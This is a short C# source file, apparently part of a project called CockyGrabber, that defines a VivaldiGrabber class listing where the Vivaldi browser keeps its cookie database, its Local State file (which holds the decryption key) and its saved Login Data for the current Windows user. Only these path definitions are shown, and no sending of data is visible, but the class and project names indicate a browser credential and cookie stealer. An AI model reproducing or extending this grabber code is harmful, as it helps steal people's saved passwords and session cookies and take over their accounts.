using System;

namespace CockyGrabber.Grabbers
{
    public class VivaldiGrabber : ChromiumGrabber
    {
        public override string ChromiumBrowserCookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Vivaldi\\User Data\\Default\\Network\\Cookies";
            }
        }
        public override string ChromiumBrowserLocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Vivaldi\\User Data\\Local State";
            }
        }
        public override string ChromiumBrowserLoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data";
            }
        }
    }
}